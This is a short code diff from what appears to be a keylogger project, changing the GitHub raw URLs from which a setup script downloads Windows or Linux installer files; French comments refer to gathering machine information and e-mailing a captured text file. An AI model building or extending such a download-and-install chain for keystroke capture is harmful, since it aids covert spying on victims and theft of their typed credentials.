@@ -39,11 +39,11 @@ while systemeExploitation!=1 and systemeExploitation!=2:
 #mail = str(input("Veuillez écrire votre mail pour recevoir le fichier txt dessus : "))
 
 if systemeExploitation==1:
-    url="https://raw.githubusercontent.com/ELREBEU/keylogger/refs/heads/main/install_and_run.bat" #A changer
-    filename='install_and_run.bat'
+    url="https://raw.githubusercontent.com/ELREBEU/keylogger/refs/heads/main/install_File_System/install_FileSystemWindows.py"
+    filename='install_FileSystemWindows.py'
 else:
-    url="https://raw.githubusercontent.com/ELREBEU/keylogger/refs/heads/main/install_and_run.sh"
-    filename='install_and_run.sh'
+    url="https://raw.githubusercontent.com/ELREBEU/keylogger/refs/heads/main/install_File_System/install_FileSystemLinux.py"
+    filename='install_FileSystemLinux.py'
 
 #-----------FIN RÉCOLTE INFOS DES MACHINES---------------
 
